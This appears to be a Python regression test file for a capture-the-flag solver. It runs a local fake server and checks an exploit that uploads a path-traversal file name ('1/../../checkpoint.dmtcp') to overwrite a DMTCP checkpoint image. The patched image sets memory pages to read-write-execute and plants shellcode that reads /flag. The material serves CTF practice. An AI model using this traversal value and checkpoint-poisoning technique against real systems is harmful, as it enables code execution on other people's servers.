"""Offline regression tests for solver/solve.py."""

from __future__ import annotations

import gzip
import importlib.util
import json
import struct
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SOLVER_PATH = ROOT / "solver" / "solve.py"
FLAG = "K17{offline_fake_flag}"
AREA_HDR_OFFSET = 32
SHELLCODE_OFFSET = 256


def load_solver():
    spec = importlib.util.spec_from_file_location("prime_calc_solver", SOLVER_PATH)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


class FakeChallenge(BaseHTTPRequestHandler):
    uploaded_payload = b""
    upload_timestamp = ""

    def log_message(self, *_args):
        return

    def _json(self, code: int, body: dict):
        data = json.dumps(body).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        if self.path == "/api/snapshot":
            raw = bytearray(SHELLCODE_OFFSET + 4096)
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            data = gzip.compress(raw)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            return
        if self.path == "/api/status":
            self._json(200, {"status": "ok", "output": FLAG})
            return
        self._json(404, {"error": "not found"})

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length)
        if self.path == "/api/config":
            FakeChallenge.uploaded_payload = body
            FakeChallenge.upload_timestamp = body.decode("latin1", errors="ignore")
            # Real app writes checkpoint before JSON validation, then usually returns 400.
            self._json(400, {"error": "invalid config contents"})
            return
        if self.path == "/api/run":
            self._json(200, {"ok": True, "output": FLAG, "status": "triggered"})
            return
        self._json(404, {"error": "not found"})


def test_solver_accepts_checkpoint_upload_400_and_extracts_flag():
    solver = load_solver()
    FakeChallenge.uploaded_payload = b""
    FakeChallenge.upload_timestamp = ""
    server = ThreadingHTTPServer(("127.0.0.1", 0), FakeChallenge)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        base_url = f"http://127.0.0.1:{server.server_address[1]}"
        got = solver.solve(
            base_url,
            area_hdr_offset=AREA_HDR_OFFSET,
            shellcode_offset=SHELLCODE_OFFSET,
            poll_attempts=1,
        )
    finally:
        server.shutdown()
        thread.join(timeout=2)

    assert got == FLAG
    assert "name=\"timestamp\"" in FakeChallenge.upload_timestamp
    assert "1/../../checkpoint.dmtcp" in FakeChallenge.upload_timestamp

    multipart = FakeChallenge.uploaded_payload
    start = multipart.find(b"\x1f\x8b")
    assert start != -1
    end_boundary = multipart.find(b"\r\n--", start)
    assert end_boundary != -1
    payload = multipart[start:end_boundary]
    patched = gzip.decompress(payload)
    assert struct.unpack_from("<Q", patched, AREA_HDR_OFFSET + 32)[0] == 7
    assert struct.unpack_from("<Q", patched, AREA_HDR_OFFSET + 40)[0] == 0x32
    assert patched[AREA_HDR_OFFSET + 88] == 0
    assert patched[SHELLCODE_OFFSET:SHELLCODE_OFFSET + 3] == b"H\x8d="


def test_build_payload_rejects_too_small_snapshot():
    solver = load_solver()
    try:
        solver.build_payload(gzip.compress(b"short"), area_hdr_offset=32, shellcode_offset=256)
    except ValueError as exc:
        assert "snapshot too small" in str(exc)
    else:
        raise AssertionError("expected ValueError")



def test_build_payload_auto_discovers_offsets():
    solver = load_solver()
    area = 0x1000
    mapping_start = 0x700000
    target_addr = mapping_start + 0x180
    raw = bytearray(0x7000)
    raw[:32] = b"DMTCP_CHECKPOINT_IMAGE_v4.0\n"
    struct.pack_into("<Q", raw, 0xF8, target_addr)
    struct.pack_into("<Q", raw, area + 0, mapping_start)
    struct.pack_into("<Q", raw, area + 8, mapping_start + 0x1000)
    struct.pack_into("<Q", raw, area + 16, 0x1000)
    struct.pack_into("<Q", raw, area + 24, 0x15000)
    struct.pack_into("<Q", raw, area + 32, 5)
    struct.pack_into("<Q", raw, area + 40, 0x12)
    raw[area + 88 : area + 88 + 34] = b"/opt/dmtcp/lib/dmtcp/libdmtcp.so\x00"
    compressed = gzip.compress(bytes(raw))

    payload = solver.build_payload(compressed, area_hdr_offset=None, shellcode_offset=None, shellcode=b"ABCD")
    patched = gzip.decompress(payload)

    assert struct.unpack_from("<Q", patched, area + 32)[0] == 7
    assert struct.unpack_from("<Q", patched, area + 40)[0] == 0x32
    assert patched[area + 88] == 0
    assert patched[area + 0x1000 + 0x180 : area + 0x1000 + 0x184] == b"ABCD"



def test_shellcode_first_path_reference_points_to_flag():
    solver = load_solver()
    shellcode = solver.SHELLCODE.rstrip(b"\x00")
    assert shellcode[:3] == b"\x48\x8d\x3d"
    displacement = struct.unpack_from("<i", shellcode, 3)[0]
    target = 7 + displacement
    assert shellcode[target : target + 6] == b"/flag\x00"



def test_auto_discovery_handles_already_poisoned_empty_name():
    solver = load_solver()
    area = 0x1000
    mapping_start = 0x700000
    target_addr = mapping_start + 0x180
    raw = bytearray(0x7000)
    raw[:32] = b"DMTCP_CHECKPOINT_IMAGE_v4.0\n"
    struct.pack_into("<Q", raw, 0xF8, target_addr)
    struct.pack_into("<Q", raw, area + 0, mapping_start)
    struct.pack_into("<Q", raw, area + 8, mapping_start + 0x1000)
    struct.pack_into("<Q", raw, area + 16, 0x1000)
    struct.pack_into("<Q", raw, area + 24, 0x15000)
    struct.pack_into("<Q", raw, area + 32, 7)
    struct.pack_into("<Q", raw, area + 40, 0x32)
    raw[area + 88] = 0

    patch_points = solver.discover_patch_points(bytes(raw))

    assert patch_points.area_hdr_offset == area
    assert patch_points.shellcode_offset == area + 0x1000 + 0x180
    assert patch_points.mapping_name == "<already-poisoned-anonymous-dmtcp-page>"
